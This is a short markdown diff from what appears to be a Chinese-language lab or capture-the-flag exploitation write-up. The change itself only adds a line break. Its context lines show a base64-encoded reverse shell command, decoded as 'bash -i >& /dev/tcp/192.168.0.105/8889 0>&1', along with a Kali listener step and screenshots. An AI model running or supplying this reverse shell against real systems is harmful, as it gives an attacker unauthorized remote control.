@@ -48,7 +48,7 @@ bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTA1Lzg4ODkgMD4mMQ==}|{bas
 编码内容→bash -i >& /dev/tcp/192.168.0.105/8889 0>&1<br>
 kali监听<br>
 ![image](https://user-images.githubusercontent.com/73600604/218240722-f36a7ac5-b2c3-4043-9b9e-54be43052799.png)
-漏洞利用
+漏洞利用<br>
 ![image](https://user-images.githubusercontent.com/73600604/218240756-52bb0691-bcbe-4057-b502-716d86aa2a1d.png)
 ![image](https://user-images.githubusercontent.com/73600604/218241387-1c6b9198-3e76-434b-8a8d-96533613cd26.png)
 春秋云境<br>
